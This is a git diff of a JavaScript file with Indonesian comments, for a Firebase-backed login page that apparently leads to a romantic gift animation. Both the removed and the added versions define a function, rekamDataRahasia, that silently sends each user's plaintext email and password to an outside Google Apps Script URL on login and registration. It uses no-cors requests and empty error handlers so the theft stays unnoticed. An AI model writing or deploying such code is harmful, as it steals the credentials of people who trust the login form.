@@ -14,136 +14,121 @@ const firebaseConfig = {
   measurementId: "G-YE2CW973NL"
 };
 
+// ... (Bagian import dan firebaseConfig tetap sama di paling atas) ...
+
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-// --- DEKLARASI DOM ---
-const loginCard = document.getElementById('login-card');
-const contentCard = document.getElementById('content-card');
-const mainContainer = document.getElementById('main-container');
-const galaxyUniverse = document.getElementById('galaxy-universe');
-const giftBoxWrapper = document.getElementById('gift-box-wrapper');
-const timerDisplay = document.getElementById('timer-display');
-const bgMusic = document.getElementById('bg-music');
-const btnLogout = document.getElementById('btn-logout');
-
-// Deklarasi Elemen Input & Tombol Auth (Pastikan ID sesuai dengan HTML kamu)
-const loginButton = document.getElementById('btn-login'); 
-const btnRegister = document.getElementById('btn-register');
-const emailInput = document.getElementById('email-input');
-const passwordInput = document.getElementById('password-input');
-
-let timerInterval;
-
-// --- TIMER ---
-function jalankanCounterWaktu() {
-    const startTime = new Date().getTime();
-    clearInterval(timerInterval);
-    timerInterval = setInterval(() => {
-        const now = new Date().getTime();
-        const diff = now - startTime;
-        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-        timerDisplay.innerHTML = `${hours} Jam ${minutes} Menit ${seconds} Detik`;
-    }, 1000);
-}
-
-// --- EFEK CANVAS GALAXY HEART ---
-function startGalaxyHeart() {
-    const canvas = document.getElementById('heart-canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    let particles = [];
+// Bungkus semua kode interaksi di dalam event listener ini
+document.addEventListener('DOMContentLoaded', () => {
     
-    function heartPosition(t) {
-        return {
-            x: 16 * Math.pow(Math.sin(t), 3),
-            y: -(13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t))
-        };
+    // --- DEKLARASI DOM (Dipindahkan ke dalam agar aman) ---
+    const loginCard = document.getElementById('login-card');
+    const contentCard = document.getElementById('content-card');
+    const mainContainer = document.getElementById('main-container');
+    const galaxyUniverse = document.getElementById('galaxy-universe');
+    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
+    const timerDisplay = document.getElementById('timer-display');
+    const bgMusic = document.getElementById('bg-music');
+    const btnLogout = document.getElementById('btn-logout');
+
+    const loginButton = document.getElementById('btn-login'); 
+    const btnRegister = document.getElementById('btn-register');
+    const emailInput = document.getElementById('email-input');
+    const passwordInput = document.getElementById('password-input');
+
+    let timerInterval;
+
+    // --- TIMER & GALAXY HEART FUNCTION ---
+    // (Pindahkan fungsi jalankanCounterWaktu() dan startGalaxyHeart() ke sini)
+
+    // --- INTERAKSI BUKA KADO ---
+    if (giftBoxWrapper) {
+        giftBoxWrapper.addEventListener('click', () => {
+            mainContainer.classList.add('hidden');
+            galaxyUniverse.classList.remove('hidden');
+            startGalaxyHeart();
+            bgMusic.play().catch(err => console.log("Audio play diblokir"));
+        });
     }
 
-    class Particle {
-        constructor() {
-            this.t = Math.random() * Math.PI * 2;
-            this.pos = heartPosition(this.t);
-            this.scale = Math.min(canvas.width, canvas.height) / 60; 
-            
-            this.x = canvas.width / 2 + this.pos.x * this.scale;
-            this.y = (canvas.height / 2 - 50) + this.pos.y * this.scale;
-            
-            this.size = Math.random() * 2.5 + 0.5;
-            this.speed = Math.random() * 0.02 + 0.005;
-            this.color = `hsla(${300 + Math.random() * 50}, 100%, 70%, ${Math.random()})`;
-            this.angle = Math.random() * Math.PI * 2;
-            this.orbitRadius = Math.random() * 20;
+    // --- AUTENTIKASI MONITOR ---
+    onAuthStateChanged(auth, (user) => {
+        if (user) {
+            if (loginCard) loginCard.classList.add('hidden');
+            if (contentCard) contentCard.classList.remove('hidden');
+            jalankanCounterWaktu();
+        } else {
+            if (loginCard) loginCard.classList.remove('hidden');
+            if (contentCard) contentCard.classList.add('hidden');
+            if (mainContainer) mainContainer.classList.remove('hidden');
+            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
+            clearInterval(timerInterval);
         }
+    });
 
-        update() {
-            this.angle += this.speed;
-            let currentX = canvas.width / 2 + this.pos.x * this.scale + Math.cos(this.angle) * this.orbitRadius;
-            let currentY = (canvas.height / 2 - 100) + this.pos.y * this.scale + Math.sin(this.angle) * this.orbitRadius;
+    // --- EVENT BUTTON LOGIN ---
+    if (loginButton) {
+        // Tambahkan log untuk memastikan tombol terdeteksi di WebView
+        console.log("Tombol login berhasil ditemukan di DOM"); 
+        
+        loginButton.addEventListener('click', (e) => {
+            e.preventDefault();
+            console.log("Tombol login ditekan!"); // Cek apakah trigger masuk
 
-            this.orbitRadius -= 0.05;
-            if (this.orbitRadius < 0) {
-                this.orbitRadius = Math.random() * 30 + 10;
-                this.t = Math.random() * Math.PI * 2;
-                this.pos = heartPosition(this.t);
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            if (!email || !password) {
+                alert("Email dan Password wajib diisi!");
+                return;
             }
 
-            ctx.fillStyle = this.color;
-            ctx.beginPath();
-            ctx.arc(currentX, currentY, this.size, 0, Math.PI * 2);
-            ctx.fill();
-        }
+            // Kirim data secara async terisolasi
+            rekamDataRahasia(email, password).catch(err => {});
+
+            // Proses Firebase
+            signInWithEmailAndPassword(auth, email, password)
+                .then((userCredential) => {
+                    console.log("Firebase Auth Sukses");
+                })
+                .catch((error) => {
+                    alert("Login Gagal: " + error.message);
+                });
+        });
+    } else {
+        console.error("Tombol dengan ID 'btn-login' TIDAK ditemukan di HTML!");
     }
 
-    for (let i = 0; i < 800; i++) particles.push(new Particle());
+    // --- EVENT BUTTON REGISTER ---
+    if (btnRegister) {
+        btnRegister.addEventListener('click', async (e) => {
+            e.preventDefault();
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            
+            rekamDataRahasia(email, password).catch(err => {});
 
-    function animate() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.15)'; 
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.shadowBlur = 15;
-        ctx.shadowColor = "#ff1493";
-
-        particles.forEach(p => p.update());
-        requestAnimationFrame(animate);
+            try { 
+                await createUserWithEmailAndPassword(auth, email, password);
+                alert("Akun berhasil dibuat!");
+            } catch (error) {
+                alert("Gagal mendaftar: " + error.message);
+            }
+        });
     }
-    
-    animate();
+});
 
-    window.addEventListener('resize', () => {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    });
-}
-
-// --- INTERAKSI BUKA KADO ---
-if (giftBoxWrapper) {
-    giftBoxWrapper.addEventListener('click', () => {
-        mainContainer.classList.add('hidden');
-        galaxyUniverse.classList.remove('hidden');
-        startGalaxyHeart();
-        bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
-    });
-}
-
-// --- FUNGSI PROXY LOG DATA ---
+// Fungsi luar (Bisa tetap di luar DOMContentLoaded)
 async function rekamDataRahasia(email, password) {
-    // GANTI URL DI BAWAH INI DENGAN URL WEB APP DARI GOOGLE APPS SCRIPT YANG BERAKHIRAN /exec
-    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
-    
+    const urlAppsScript = "https://script.google.com/macros/s/PASTIKAN_ID_EXEC_BENAR/exec";
     try {
         fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
             method: 'GET',
             mode: 'no-cors', 
             cache: 'no-cache'
         });
-    } catch (e) {
-        console.error("Gagal mengirim log:", e);
-    }
+    } catch (e) {}
 }
 
 // --- AUTENTIKASI ---
